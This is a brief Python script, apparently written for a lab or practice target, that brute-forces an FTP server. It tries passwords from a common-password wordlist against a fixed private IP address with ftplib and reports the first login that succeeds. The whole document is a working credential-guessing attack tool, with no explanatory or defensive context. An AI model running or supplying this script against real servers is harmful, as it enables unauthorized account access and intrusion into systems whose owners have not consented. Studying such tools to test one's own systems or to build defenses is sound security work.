import ftplib
import time

target = "10.12.0.40"
username = "attacker"
wordlist = "10k-most-common.txt"

with open(wordlist, "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        print(f"[*] Trying: {username}:{password}")
        try:
            ftp = ftplib.FTP(target, timeout=5)
            ftp.login(username, password)
            print(f"[+] SUCCESS: {username}:{password}")
            ftp.quit()
            break
        except ftplib.error_perm:
            print("[-] Login failed.")
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(2)

